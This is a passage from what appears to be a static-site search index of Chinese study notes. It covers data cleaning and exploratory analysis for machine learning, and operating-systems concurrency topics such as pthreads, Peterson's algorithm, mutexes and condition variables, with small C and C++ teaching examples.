\u7b49\u4ee3\u66ff\uff0c\u4f7f\u7528\u65f6\u9700\u7edf\u4e00</li> <li>\u53bb\u9664\u7f3a\u5931\u503c\u6240\u5728\u7684\u6837\u672c</li> <li>\u5982\u679c\u67d0\u4e2a\u7279\u5f81\u7f3a\u5931\u503c\u5f88\u591a\uff0c\u5219\u76f4\u63a5\u53bb\u6389\u8be5\u7279\u5f81</li> <li>\u7528\u5e73\u5747\u503c\u3001\u4e2d\u4f4d\u6570\u7b49\u586b\u5145\u7f3a\u5931\u503c</li> </ul> <p>\u5bf9\u4e8e\u91cd\u590d\u503c Duplicates \u53ef\u9009\u5904\u7406\uff1a</p> <ul> <li>\u53bb\u9664\u91cd\u590d\u7684\u6837\u672c</li> </ul> <p>\u5bf9\u4e8e\u6781\u7aef\u503c Outliers\uff0c\u53ef\u9009\u5904\u7406\uff1a</p> <ul> <li>\u4fee\u526a\u6570\u636e\uff0c\u53bb\u9664\u4f60\u8ba4\u4e3a\u53ef\u80fd\u7684\u6781\u7aef\u503c</li> <li>\u6216\u8005\u5c06\u6781\u7aef\u503c\u66ff\u6362\u4e3a\u5408\u7406\u7684\u503c\uff0c\u6bd4\u5982\u4e2d\u4f4d\u6570</li> <li>\u5bf9\u4e8e\u67d0\u4e2a\u7279\u5f81\uff0c\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u6700\u5927\u6700\u5c0f\u8303\u56f4\uff0c\u8303\u56f4\u5916\u7684\u90fd\u4e3a\u6781\u7aef\u503c<ul> <li>\u5e38\u7528\u5206\u4f4d\u6570 quantile \u6765\u5b9a\u4e49\u6781\u7aef\u503c\u3002</li> <li>\u5c06\u67d0\u7ef4\u5ea6\u6309\u7167\u5927\u5c0f\u6392\u5e8f\u540e\uff0c\u6bcf 25% \u5206\u754c\uff0c\u4e0b\u56db\u5206\u4f4d 25% \u8bb0\u4e3a Q1\uff0c\u4e0a\u56db\u5206\u4f4d 75% \u8bb0\u4e3a Q3\uff0cIQR = Q3 - Q1</li> <li>\u90a3\u4e48\u4e0a\u9650\u4e3a Q3 + 1.5 IQR\uff1b\u4e0b\u9650\u4e3a Q1 - 1.5 IQR</li> </ul> </li> </ul> <p>\u5982\u4f55\u9009\u62e9\u586b\u5145\u6216\u66ff\u6362\u7684\u503c</p> <ul> <li>\u5e73\u5747\u503c\uff1a\u7f3a\u70b9\u662f\u5bf9\u4e8e\u6781\u7aef\u503c\u8f83\u654f\u611f</li> <li>\u4e2d\u4f4d\u6570\uff1a\u66f4\u597d\u5904\u7406\u5e26\u6781\u7aef\u503c\u7684\u60c5\u51b5</li> <li>\u4f17\u6570\uff1a\u5bf9\u4e8e\u4e2d\u95f4\u8d8b\u52bf\u7684\u8bc4\u4f30\u4e0d\u597d</li> </ul>"},{"location":"Accumulation/ML/Data%20Analysis/#eda","title":"\u63a2\u7d22\u6027\u6570\u636e\u5206\u6790 EDA","text":"<ul> <li>\u5355\u53d8\u91cf\u6570\u636e\uff1a\u5206\u5e03\uff0c\u96c6\u4e2d\u8d8b\u52bf\uff0c\u5206\u6563\u7a0b\u5ea6</li> <li>\u53cc\u53d8\u91cf\u6570\u636e\uff1a\u76f8\u5173\u6027\u5206\u6790</li> <li>\u53ef\u89c6\u5316\uff1a\u67f1\u72b6\u56fe\uff0c\u7bb1\u578b\u56fe\uff0c\u6563\u70b9\u56fe\uff0c\u7ebf\u56fe\uff0c\u997c\u56fe\uff0c\u70ed\u529b\u56fe</li> </ul>"},{"location":"Accumulation/ML/Misc/","title":"\u6742\u9879","text":""},{"location":"Accumulation/ML/Misc/#_1","title":"\u6742\u9879","text":"<p> \u7ea6 204 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u673a\u5668\u5b66\u4e60\u662f AI \u7684\u4e00\u4e2a\u5206\u652f\uff0c\u9700\u8981\u63a5\u89e6\u5927\u91cf\u6570\u636e\u5e76\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u8fdb\u884c\u5904\u7406\u3002</p>"},{"location":"Accumulation/ML/Misc/#usage","title":"Usage","text":""},{"location":"Accumulation/ML/Misc/#segment-customers","title":"Segment Customers","text":"<p>\u5ba2\u6237\u7ec6\u5206\u6307\u8bc6\u522b\u51fa\u5177\u6709\u76f8\u4f3c\u7279\u5f81\u7684\u5ba2\u6237\u7fa4\u4f53\uff0c\u5305\u62ec\u5f7c\u6b64\u884c\u4e3a\u4e0d\u540c\u7684\u5ba2\u6237\u7fa4\u4f53\u3002\u4e00\u65e6\u5b9a\u4e49\u4e86\u5ba2\u6237\u7ec6\u5206\uff0c\u51b3\u7b56\u8005\u53ef\u4ee5\u91c7\u53d6\u9002\u5f53\u63aa\u65bd\u6765\u6ee1\u8db3\u4ed6\u4eec\u7684\u9700\u6c42\u3002\u5ba2\u6237\u7ec6\u5206\u6a21\u578b\u5e2e\u52a9\u5bf9\u5b9a\u4e49\u7684\u5ba2\u6237\u8fdb\u884c\u4e2a\u6027\u5316\u8425\u9500\u3002</p> <p>\u5728\u9884\u6d4b\u5efa\u6a21\u4e2d\uff0c\u5c06\u6570\u636e\u5206\u4e3a\u8bad\u7ec3\u96c6\u548c\u6d4b\u8bd5\u96c6\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8bc4\u4f30\u6a21\u578b\u5728\u65b0\u6570\u636e\u4e0a\u7684\u8868\u73b0\u3002\u8bad\u7ec3\u96c6\u7528\u4e8e\u6784\u5efa\u6a21\u578b\uff0c\u800c\u6d4b\u8bd5\u96c6\u5219\u5e2e\u52a9\u68c0\u6d4b\u6a21\u578b\u662f\u5426\u5177\u6709\u826f\u597d\u7684\u6cdb\u5316\u80fd\u529b\uff0c\u4ece\u800c\u907f\u514d\u8fc7\u62df\u5408\u7684\u95ee\u9898\u3002</p> <p>\u5212\u5206\u8bad\u7ec3\u96c6\u3001\u6d4b\u8bd5\u96c6\uff1atrain-test split</p>"},{"location":"Accumulation/NJUOS/","title":"\u5357\u4eac\u5927\u5b66 \u64cd\u4f5c\u7cfb\u7edf\u539f\u7406","text":""},{"location":"Accumulation/NJUOS/#_1","title":"\u5357\u4eac\u5927\u5b66 \u64cd\u4f5c\u7cfb\u7edf\u539f\u7406","text":"<p> \u7ea6 59 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>2025\u5e74\u6625\u5b66\u671f</p> <ul> <li>\u8bfe\u7a0b\u7f51\u7ad9</li> <li>\u8bfe\u7a0b\u5f55\u64ad</li> </ul> <p>Quote</p> <ul> <li>\u5e94\u7528\u89c6\u89d2\u7684\u64cd\u4f5c\u7cfb\u7edf\uff1a\u5bf9\u8c61 + API</li> <li>\u786c\u4ef6\u89c6\u89d2\u7684\u64cd\u4f5c\u7cfb\u7edf\uff1a\u7a0b\u5e8f</li> <li>\u6570\u5b66\u89c6\u89d2\u7684\u64cd\u4f5c\u7cfb\u7edf\uff1a\u72b6\u6001\u673a</li> </ul>"},{"location":"Accumulation/NJUOS/concurrency/","title":"\u5e76\u53d1","text":""},{"location":"Accumulation/NJUOS/concurrency/#_1","title":"\u5e76\u53d1","text":"<p> \u7ea6 2708 \u4e2a\u5b57  126 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>\u5e76\u53d1\u548c\u5e76\u884c\u7684\u533a\u522b</p> <ul> <li>\u5e76\u53d1\u662f\u903b\u8f91\u4e0a\u7684\u201c\u540c\u65f6\u6267\u884c\u201d\uff0c\u662f\u7531\u64cd\u4f5c\u7cfb\u7edf\u6216\u8fd0\u884c\u5e93\u6a21\u62df\u51fa\u7684\u8f6e\u6d41\u6267\u884c<ul> <li>\u771f\u6b63\u610f\u4e49\u7684\u540c\u65f6\u6267\u884c\u5f53\u7136\u4e5f\u5c5e\u4e8e\u5e76\u53d1</li> </ul> </li> <li>\u5e76\u884c\u662f\u771f\u6b63\u610f\u4e49\u4e0a\u7684\u201c\u540c\u65f6\u6267\u884c\u201d\uff0c\u6709\u5171\u4eab\u5185\u5b58\u7684\u591a\u4e2a\u5904\u7406\u5668\u540c\u65f6\u6267\u884c\u6307\u4ee4</li> </ul>"},{"location":"Accumulation/NJUOS/concurrency/#_2","title":"\u591a\u5904\u7406\u5668\u7f16\u7a0b","text":"<p>\u4e3a\u4e86\u5e94\u5bf9\u591a\u7ebf\u7a0b\u7f16\u7a0b\u7684\u9700\u6c42\uff0c\u64cd\u4f5c\u7cfb\u7edf\u65b0\u589e\u52a0\u4e86\u4e00\u4e2a\u53ef\u5171\u4eab\u5185\u5b58\u7684\u8fdb\u7a0b\u7ba1\u7406 API\uff1a<code>spawn()</code>\u3002</p> <p>\u4f7f\u7528 <code>spawn()</code> \u521b\u5efa\u7684\u72b6\u6001\u673a\u548c\u539f\u8fdb\u7a0b\u5171\u4eab\u5168\u5c40\u53d8\u91cf\uff0c\u800c\u62e5\u6709\u72ec\u7acb\u7684\u6808\u3002</p> <p>jyy \u8bfe\u4e0a\u7528\u7684\u662f\u4ed6\u81ea\u5df1\u5199\u7684\u5c0f\u5934\u6587\u4ef6 <code>thread.h</code>\uff0c\u53ea\u6709 <code>spawn(fn)</code> \u548c <code>join</code> \u4e24\u4e2a\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u4eec\u8fd8\u662f\u76f4\u63a5\u4f7f\u7528\u6807\u51c6\u5e93 <code>pthread.h</code>\uff1a</p> <ul> <li><code>pthread_create(&amp;tid, NULL, fn, &amp;arg)</code> \u521b\u5efa\u4e00\u4e2a\u5165\u53e3\u51fd\u6570\u4e3a <code>fn</code> \u7684\u7ebf\u7a0b\uff0c\u5e76\u7acb\u5373\u5f00\u59cb\u6267\u884c<ul> <li><code>tid</code> \u7528\u4e8e\u63a5\u6536\u4fdd\u5b58\u7ebf\u7a0b ID\uff0c</li> </ul> </li> <li><code>pthread_join(tid, NULL)</code> \u7b49\u5f85\u6307\u5b9a\u7ebf\u7a0b\u7684\u8fd4\u56de\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7528\u4e8e\u63a5\u6536\u8fd4\u56de\u503c\uff0c\u4e00\u822c\u4e3a <code>NULL</code><ul> <li><code>main</code> \u51fd\u6570\u9ed8\u8ba4\u4f1a join \u6240\u6709\u7ebf\u7a0b</li> </ul> </li> </ul> <pre><code>#include &lt;pthread.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct {\n    int id;\n} ThreadArg;\n\nint a;\n\nvoid* thread_func(void* arg) {\n    ThreadArg* t_arg = (ThreadArg*)arg;\n    pthread_t tid = pthread_self(); // \u83b7\u53d6\u7ebf\u7a0b\u81ea\u8eab\u7684 ID\n    printf(\"Thread id = %d, tid = %lu, a = %d\\n\", t_arg-&gt;id, (unsigned long)tid, a++);\n    pthread_exit(NULL);\n}\n\nint main() {\n    a = 0;\n    const int THREAD_COUNT = 5;\n    pthread_t threads[THREAD_COUNT];\n    ThreadArg args[THREAD_COUNT];\n\n    for (int i = 0; i &lt; THREAD_COUNT; ++i) {\n        args[i].id = i;\n        pthread_create(&amp;threads[i], NULL, thread_func, &amp;args[i]);\n    }\n\n    for (int i = 0; i &lt; THREAD_COUNT; ++i) {\n        pthread_join(threads[i], NULL);\n    }\n\n    return 0;\n}\n\n/* Sample Output:\nThread id = 0, tid = 140572740683328, a = 0\nThread id = 1, tid = 140572732229184, a = 1\nThread id = 3, tid = 140572715320896, a = 2\nThread id = 4, tid = 140572706866752, a = 3\nThread id = 2, tid = 140572723775040, a = 4\n*/\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 <code>id</code> \u5e76\u6ca1\u6709\u6309\u7167\u987a\u5e8f\u88ab\u6253\u5370\u51fa\u6765\uff0c\u8fd9\u662f\u56e0\u4e3a\u7a0b\u5e8f\u662f\u5e76\u53d1\u7684\u3002</p> <p>\u4f7f\u7528\u7ed3\u6784\u4f53\u8fdb\u884c\u4f20\u53c2\u662f\u4e00\u4e2a\u8f83\u901a\u7528\u7684\u5b9e\u8df5\uff0c\u9002\u5408\u4f20\u9012\u4e0d\u540c\u7c7b\u578b\u53c2\u6570</p> <p>\u865a\u62df\u5316\u4f7f\u5f97\u8fdb\u7a0b\u8ba4\u4e3a\u4e16\u754c\u4e0a\u53ea\u6709\u81ea\u5df1\uff0c\u5373\u9664\u4e86\u7cfb\u7edf\u8c03\u7528\uff0c\u7a0b\u5e8f\u7684\u884c\u4e3a\u662f\u786e\u5b9a\u6027\u7684\uff0c\u5728\u540c\u4e00\u521d\u59cb\u72b6\u6001\u6bcf\u6b21\u91cd\u65b0\u8fd0\u884c\u90fd\u6709\u76f8\u540c\u7684\u7ed3\u679c\u3002</p> <p>\u4f46\u662f\u5e76\u53d1\u6253\u7834\u4e86\u8fd9\u4e00\u70b9\uff0c\u5e76\u53d1\u7a0b\u5e8f\u6bcf\u6b21 non-deterministically \u9009\u62e9\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c\uff0c\u8fd9\u79cd\u975e\u786e\u5b9a\u6027\u7a0b\u5e8f\u4f7f\u5f97\u7a0b\u5e8f\u7406\u89e3\u8d77\u6765\u76f8\u5f53\u56f0\u96be\u3002</p> <p>\u5e76\u53d1\u8fd9\u79cd\u975e\u786e\u5b9a\u6027\u5e26\u6765\u7684\u8d1f\u9762\u5f71\u54cd\u548c\u6570\u636e\u5e93\u4e2d\u7684\u5e76\u53d1\u7c7b\u4f3c\uff0c\u6b64\u5904\u4e5f\u4e0d\u518d\u5c55\u5f00</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u7f16\u8bd1\u5668\u4f18\u5316\u7684\u4e00\u4e2a\u91cd\u8981\u524d\u63d0\u662f\u7a0b\u5e8f\u662f\u786e\u5b9a\u6027\u7684\uff0c\u53cd\u8fc7\u6765\u8fd9\u4e5f\u610f\u5473\u7740\u6211\u4eec\u5728\u5e76\u53d1\u7f16\u7a0b\u65f6\u4e0d\u4ec5\u8981\u6ce8\u610f\u591a\u7ebf\u7a0b\u4e71\u5e8f\u5e26\u6765\u7684\u5f71\u54cd\uff0c\u8fd8\u8981\u601d\u8003\u7f16\u8bd1\u5668\u5bf9\u6e90\u4ee3\u7801\u7684\u4f18\u5316\u3002</p> <p>\u8981\u63a7\u5236\u7f16\u8bd1\u5668\u4f18\u5316\u7684\u884c\u4e3a\uff0c\u6211\u4eec\u53ef\u4ee5\u63d2\u5165\u4e0d\u53ef\u4f18\u5316\u7684\u4ee3\u7801\u5757\u6216\u8005\u6807\u8bb0\u53d8\u91cf\u4e3a\u4e0d\u53ef\u4f18\u5316\uff1a</p> <pre><code>/// Method 1\nwhile (!flag)\n{\n    asm volatile (\"\" ::: \"memory\"); // \u58f0\u660e\u8fd9\u6bb5\u4ee3\u7801\u4f1a\u6539\u5199\u5185\u5b58\n}\n\n/// Method 2 \nint volatile flag;\nwhile (!flag);\n</code></pre> <p></p>"},{"location":"Accumulation/NJUOS/concurrency/#_3","title":"\u5e76\u53d1\u63a7\u5236","text":""},{"location":"Accumulation/NJUOS/concurrency/#_4","title":"\u4e92\u65a5","text":"<p>\u6211\u4eec\u5e0c\u671b\u5f15\u5165\u65b0\u673a\u5236\uff0c\u963b\u6b62\u5e76\u53d1\u7a0b\u5e8f\u7684\u5e76\u53d1\uff0c\u4ee5\u7ef4\u6301\u5e76\u53d1\u7a0b\u5e8f\u7684\u6b63\u786e\u6027\u3002\u4e00\u79cd\u4e00\u822c\u7684\u601d\u60f3\u662f\u4e3a\u67d0\u6bb5\u6211\u4eec\u4e0d\u60f3\u5b83\u5e76\u53d1\u7684\u4ee3\u7801\u5757\u65bd\u52a0\u4e92\u65a5\u9501\u6807\u8bb0\uff0c\u4ece\u800c\u963b\u6b62\u5e76\u53d1\u7684\u53d1\u751f\uff1a</p> <pre><code>lock();\nsum++;\nunlock();\n</code></pre> <p>\u5386\u53f2\u4e0a\uff0c\u5bf9\u4e8e\u4e92\u65a5\u6709\u5f88\u591a\u4e0d\u540c\u7684\u5c1d\u8bd5\uff0c\u5728\u672c\u8bfe\u7a0b\u4ece\u4ee5\u4e0b\u4e09\u70b9\u8bb2\u8ff0\u3002</p>"},{"location":"Accumulation/NJUOS/concurrency/#method1","title":"Method1: \u5171\u4eab\u5185\u5b58","text":"<p>\u5b9e\u9645\u4e0a\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e0d\u592a\u6b63\u786e\u7684\u5c1d\u8bd5\u65b9\u5411\uff0c\u5b83\u505a\u4e86\u5e76\u53d1\u7f16\u7a0b\u4e2d\u4e0d\u6b63\u786e\u7684\u5047\u8bbe</p> <ul> <li>\u5047\u8bbe Load/Store \u6307\u4ee4\u662f\u77ac\u95f4\u5b8c\u6210\u4e14\u751f\u6548\u7684</li> <li>\u5047\u8bbe\u6307\u4ee4\u90fd\u6309\u7167\u4e66\u5199\u987a\u5e8f\u6267\u884c</li> </ul> <p>1981 \u5e74 Gray Peterson \u5728\u8f6f\u4ef6\u5c42\u9762\u4e0a\u63d0\u51fa\u4e86\u4e00\u4e2a\u4e92\u65a5\u7b97\u6cd5\uff0c\u5b83\u53ea\u80fd\u7528\u4e8e\u89e3\u51b3\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u4e92\u65a5\u95ee\u9898\uff0c\u4fdd\u8bc1\u4e24\u4e2a\u8fdb\u7a0b\u4e0d\u4f1a\u540c\u65f6\u8fdb\u5165\u4e34\u754c\u533a\u3002</p> <p>\u4e34\u754c\u533a\uff1a\u53ef\u4ee5\u662f\u5171\u4eab\u5185\u5b58</p> <p>\u5bf9\u4e8e\u4e24\u4e2a\u8fdb\u7a0b <code>p0</code>\uff0c<code>p1</code> \u548c\u4e00\u4e2a\u4e34\u754c\u533a <code>M</code>\uff0c\u7b97\u6cd5\u5b9a\u4e49\u4e86\u4e09\u4e2a\u63a7\u5236\u53d8\u91cf\uff1a</p> <pre><code>bool flag[2]; // flag[0] for p0, flag[1] for p1\nint turn;     // for M\n</code></pre> <p>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u60f3\u8981\u8bbf\u95ee\u4e34\u754c\u533a\u65f6\uff0c\u9700\u8981\u5148\u8bbe\u7f6e\u81ea\u5df1\u7684 <code>flag</code>\uff0c\u7136\u540e\u5c06\u4e34\u754c\u533a\u7684 <code>turn</code> \u8bbe\u7f6e\u4e3a\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u7684\u503c\u3002\u8bbe\u7f6e\u5b8c\u540e\uff0c\u8be5\u8fdb\u7a0b\u8fdb\u5165\u89c2\u5bdf\u6a21\u5f0f\uff0c\u5982\u679c\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u7684 <code>flag</code> \u4e3a\u5426\uff0c\u6216\u8005\u53e6\u4e00\u4e2a\u8fdb\u7a0b <code>flag</code> \u4e3a\u662f\u4f46\u662f\u4e34\u754c\u533a\u7684 <code>turn</code> \u4e0a\u662f\u81ea\u5df1\uff0c\u5219\u5141\u8bb8\u8fdb\u5165\u5e76\u72ec\u5360\u4e34\u754c\u533a\u3002</p> <pre><code>/// p0 action\n// entry\nflag[0] = true;\nturn = 1;\nwhile (flag[1] &amp;&amp; turn == 1);\n\n/* do sth critical */\n...\n\n// exit\nflag[0] = false;\n</code></pre> <p>\u8fd9\u6837\uff0c\u5f53\u4e24\u4e2a\u8fdb\u7a0b\u540c\u65f6\u60f3\u8981\u8bbf\u95ee\u4e34\u754c\u533a\uff0c\u7531\u4e8e\u5bf9\u4e8e <code>turn</code> \u7684\u8bbe\u7f6e\u6709\u5148\u540e\u5173\u7cfb\uff0c\u540e\u8bbe\u7f6e <code>turn</code> \u7684\u8fdb\u7a0b\u4e00\u5b9a\u4f1a\u628a <code>turn</code> \u8bbe\u7f6e\u6210\u5148\u8bbf\u95ee\u7684\u8fdb\u7a0b\u7684\u503c\uff0c\u8fd9\u6837\u5148\u53d1\u51fa\u8bbf\u95ee\u64cd\u4f5c\u7684\u8fdb\u7a0b\u5c31\u53ef\u4ee5\u5148\u8fdb\u5165\u4e34\u754c\u533a\uff0c\u4ece\u800c\u5b9e\u73b0\u4e92\u65a5\u3002</p> <p>\u6ce8\u610f entry \u90e8\u5206 <code>flag</code> \u548c <code>turn</code> \u7684\u8bbe\u7f6e\u987a\u5e8f\u4e0d\u80fd\u6539\u53d8</p>"},{"location":"Accumulation/NJUOS/concurrency/#method2","title":"Method2: \u539f\u5b50\u6307\u4ee4","text":"<p>Peterson \u7b97\u6cd5\u8bd5\u56fe\u5728\u8f6f\u4ef6\u5c42\u9762 Load/Store \u4e0a\u5b9e\u73b0\u4e92\u65a5\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5411\u786c\u4ef6\u5c42\u9762\u5bfb\u6c42\u5e2e\u52a9\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u539f\u5b50\u6307\u4ee4\u3002</p> <p>\u4f53\u7cfb\u7ed3\u6784\u4e2d\u6709\u8bb2\uff0c\u5728 RISC-V \u4e2d\u8868\u73b0\u4e3a <code>LR/SC</code> \u548c\u81ea\u65cb\u9501\u7b49</p> <p></p> <p>\u4f46\u662f\u968f\u7740\u7ebf\u7a0b\u6570\u7684\u589e\u52a0\uff0c\u6027\u80fd\u4f1a\u65ad\u5d16\u5f0f\u7684\u4e0b\u964d\uff0c\u8fd9\u662f Spinlock \u7684\u4e0d\u8db3\u3002</p>"},{"location":"Accumulation/NJUOS/concurrency/#method3","title":"Method3: \u7cfb\u7edf\u8c03\u7528","text":"<p>\u4e0a\u8ff0\u65b9\u6cd5\u7684\u81ea\u65cb\u9501\u5b58\u5728\u4e24\u70b9\u6027\u80fd\u95ee\u9898\uff1a</p> <ul> <li>\u9664\u4e86\u83b7\u5f97\u9501\u7684\u8fdb\u7a0b\uff0c\u5176\u5b83\u5904\u7406\u5668\u7684\u8fdb\u7a0b\u90fd\u5728\u7a7a\u8f6c\u7b49\u5f85\u9501\u91ca\u653e</li> <li>\u5e94\u7528\u7a0b\u5e8f\u4e0d\u80fd\u5173\u4e2d\u65ad</li> </ul> <p>\u8fd9\u4e2a\u95ee\u9898\u7ebf\u7a0b\u65e0\u6cd5\u81ea\u5df1\u89e3\u51b3\uff0c\u6211\u4eec\u9700\u8981\u5c06\u9501\u7684\u5b9e\u73b0\u653e\u5230\u64cd\u4f5c\u7cfb\u7edf\u7684 API \u4e2d\u3002\u800c\u6211\u4eec\u7684\u4e00\u4e9b\u5e93\u53c8\u5bf9\u8fd9\u4e9b API \u505a\u4e86\u4e00\u4e9b\u5c01\u88c5\uff0c\u4ece\u800c\u5f97\u5230\u4e86\u73b0\u5728\u6211\u4eec\u4f7f\u7528\u7684 Mutex\uff1a</p> <pre><code>#include &lt;pthread.h&gt;\n\npthread_mutex_t lock;\npthread_mutex_init(&amp;lock, NULL);\n\npthread_mutex_lock(&amp;lock);\npthread_mutex_unlock(&amp;lock);\n</code></pre> <p>\u603b\u7684\u6765\u8bf4\uff0c\u5355\u8bba\u6027\u80fd\uff0cAtomic &gt; Mutex &gt; Spin\u3002</p>"},{"location":"Accumulation/NJUOS/concurrency/#_5","title":"\u540c\u6b65","text":""},{"location":"Accumulation/NJUOS/concurrency/#_6","title":"\u6761\u4ef6\u53d8\u91cf","text":"<p>Lock \u89e3\u51b3\u4e86\u5e76\u53d1\u7684\u539f\u5b50\u6027\u95ee\u9898\uff0c\u4f46\u662f\u6ca1\u6709\u7ed9\u6211\u4eec\u786e\u5b9a\u6027\u3002\u6211\u4eec\u4f7f\u7528\u540c\u6b65\u63a7\u5236\u4e8b\u4ef6\u53d1\u751f\u7684\u5148\u540e\u987a\u5e8f\u3002</p> <p>\u4e8b\u4ef6\u7684\u987a\u5e8f\u76f8\u5f53\u4e8e\u4e00\u4e2a Precedence Graph\uff0c\u800c\u540c\u4e00\u4e2a\u7ebf\u7a0b\u5185\u7684\u4e8b\u4ef6\u5929\u7136\u5b58\u5728 happens-before \u5173\u7cfb\uff0c\u975e\u540c\u4e00\u4e2a\u7ebf\u7a0b\u7684\u4e8b\u4ef6\u5219\u9700\u8981\u6211\u4eec\u989d\u5916\u8bbe\u7f6e\u3002</p> <p>\u6ca1\u6709 happens-before \u7684\u4ee3\u7801\u5c31\u662f\u5e76\u53d1\u7684\uff0c\u5728\u591a\u5904\u7406\u5668\u53ef\u4ee5\u5e76\u884c\u6267\u884c</p> <p>\u5982\u679c\u6211\u4eec\u624b\u52a8\u4e3a\u7ebf\u7a0b\u6784\u9020\u4e00\u4e2a\u5faa\u73af\uff0c\u5f53\u524d\u4e00\u4e2a\u4e8b\u4ef6\u7684\u5b8c\u6210\u6807\u5fd7\u4e0d\u4e3a <code>True</code> \u65f6\u5219\u5faa\u73af\u7b49\u5f85\uff0c\u5219\u53c8\u9677\u5165\u4e86\u81ea\u65cb\u9501\u7a7a\u8f6c\u6d6a\u8d39 CPU \u6027\u80fd\u7684\u95ee\u9898\uff0c\u56e0\u6b64\u8fd9\u4e2a\u64cd\u4f5c\u4e5f\u8981\u7531\u64cd\u4f5c\u7cfb\u7edf\u7684 API \u5b8c\u6210\u3002</p> <p>\u8fc7\u53bb\u7684\u64cd\u4f5c\u7cfb\u7edf\u8bbe\u8ba1\u7684\u4e0d\u90a3\u4e48\u590d\u6742\uff1a</p> <ul> <li>\u5f53\u6761\u4ef6\u4e0d\u6ee1\u8db3\u65f6\u7b49\u5f85\uff0c\u8ba9\u51fa CPU<ul> <li><code>wait</code>\uff1a\u76f4\u63a5\u7b49\u5f85\u7761\u7720</li> </ul> </li> <li>\u6761\u4ef6\u6ee1\u8db3\u65f6\u7531\u524d\u4e00\u4e2a\u8fdb\u7a0b\u53d1\u51fa\u4fe1\u53f7\u7ee7\u7eed<ul> <li><code>signal/broadcast</code>\uff1a\u5524\u9192\u6240\u6709\u7b49\u5f85\u7684\u8fdb\u7a0b</li> </ul> </li> </ul> <p>C++11 \u4e2d\u5f15\u5165\u4e86\u6761\u4ef6\u53d8\u91cf <code>condition_variable</code>\uff0c\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c <code>wait_until(condition)</code> \u7684\u529f\u80fd\uff0c\u5b83\u4f7f\u7528 lambda \u8868\u8fbe\u5f0f\u4f5c\u4e3a\u6761\u4ef6\u53c2\u6570\uff1a</p> <pre><code>std::mutex mtx;\nstd::condition_variable cv;\n\nvoid fn() {\n    std::unique_lock lk(mtx);\n\n    cv.wait(lk,\n        []{ return can_proceed; }\n    );\n\n    // \u6b64\u65f6\u4e00\u5b9a\u6709 can_proceed = True \u5b58\u5728\n    // do sth here\n\n    cv.notify_all(); // \u5524\u9192\u7b49\u5f85\u8fdb\u7a0b\n    lk.unlock();\n}\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u4ee5\u4e00\u4e2a\u7ecf\u5178\u540c\u6b65\u95ee\u9898 \u751f\u4ea7\u8005-\u6d88\u8d39\u8005\u95ee\u9898 \u4f5c\u4e3a\u4f8b\u5b50\u8bb2\u89e3\uff1a</p> <p>Producer \u548c Consumer \u5171\u4eab\u4e00\u4e2a\u7f13\u51b2\u533a\u3002\u5982\u679c\u7f13\u51b2\u533a\u6709\u7a7a\u4f4d\uff0c\u5219 Producer \u653e\u5165\u6570\u636e\uff0c\u5426\u5219\u7b49\u5f85\uff1b\u5982\u679c\u7f13\u51b2\u533a\u6709\u6570\u636e\uff0c\u5219 Consumer \u53d6\u51fa\u6570\u636e\uff0c\u5426\u5219\u7b49\u5f85\u3002\u540c\u4e00\u4e2a object \u7684\u751f\u4ea7\u5fc5\u987b\u5148\u4e8e\u6d88\u8d39\u3002</p> <pre><code>void produce(Object obj);\nObject consume();\n</code></pre> <p>\u6b64\u5904\u6211\u4eec\u7b80\u5316\u95ee\u9898\uff0c\u5047\u8bbe <code>produce</code> \u6253\u5370\u5de6\u62ec\u53f7\uff0c<code>consume</code> \u6253\u5370\u53f3\u62ec\u53f7\uff0c\u53ea\u9700\u8981\u6253\u5370\u7684\u62ec\u53f7\u5e8f\u5217\u6b63\u786e\u5373\u53ef\uff1a</p> <pre><code>void produce() { printf(\"(\"); }\nvoid consume() { printf(\")\"); }\n</code></pre> <p>\u6b64\u5916\uff0c\u7f13\u51b2\u533a\u5927\u5c0f <code>n</code> \u53ef\u80fd\u6709\u9650\uff0c\u62ec\u53f7\u5d4c\u5957\u6df1\u5ea6\u4e0d\u80fd\u8d85\u8fc7 <code>n</code></p> <p>\u9996\u5148\u8981\u660e\u786e\u6267\u884c\u6761\u4ef6\uff1a</p> <ul> <li>\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5 produce\uff1f<ul> <li>\u7f13\u51b2\u533a\u6709\u7a7a\u4f4d</li> </ul> </li> <li>\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5 consume\uff1f<ul> <li>\u7f13\u51b2\u533a\u975e\u7a7a</li> </ul> </li> </ul> <pre><code>void produce() {\n    mutex_lock(\ud83d\udd12);\n    while (!(depth &lt; n)) {\n        // \u7531\u4e8e\u5524\u9192\u662f\u5e7f\u64ad\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u8981\u653e\u5165 while \u4e2d\u786e\u4fdd\u6761\u4ef6\u6ee1\u8db3\u518d\u8fdb\u884c\n        cond_wait(&amp;cv, \ud83d\udd12); // \u7b49\u5f85 cv \u5524\u9192\n    }\n\n    assert(depth &lt; n);\n    depth++;\n    printf(\"(\"); // put object to queue\n\n    cond_broadcast(&amp;cv); // \u5e7f\u64ad\u5524\u9192\u6240\u6709 wait(cv)\n    